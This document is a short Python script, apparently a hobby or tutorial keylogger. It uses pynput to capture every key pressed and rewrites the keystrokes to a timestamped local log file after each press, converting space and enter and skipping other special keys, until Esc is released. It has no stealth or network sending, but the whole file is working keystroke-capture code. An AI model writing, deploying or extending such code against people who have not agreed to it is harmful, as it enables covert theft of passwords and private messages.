from pynput.keyboard import Key, Listener
from datetime import time, datetime, date

count = 0
keys = []


current_time = datetime.now().strftime("%Y%m%d_%Hh_%Mm_%Ss")
print(current_time)


def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    # print("{0} pressed".format(key))

    # if count >= 10:
    #     count = 0
    write_file(keys)
    # keys = []


def write_file(keys):
    with open(f"{current_time}_log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            Key.space
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
